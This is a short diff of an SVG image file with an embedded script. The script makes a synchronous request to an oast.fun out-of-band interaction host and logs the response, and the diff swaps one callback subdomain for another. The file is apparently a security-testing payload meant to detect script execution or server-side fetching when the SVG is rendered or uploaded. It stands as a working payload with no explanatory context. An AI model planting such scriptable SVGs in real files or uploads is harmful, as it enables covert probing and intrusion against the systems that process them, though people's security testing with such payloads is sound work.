@@ -1,7 +1,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <script>
     const xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://fyxljyjhbizfrvxcnzcdrzu32jhefq09m.oast.fun', false); // synchronous request
+    xhr.open('GET', 'http://ilszoosdwkrjtvtnnghmtqhhyequrlqxk.oast.fun', false); // synchronous request
     xhr.send();
 
     console.log(xhr.responseText);
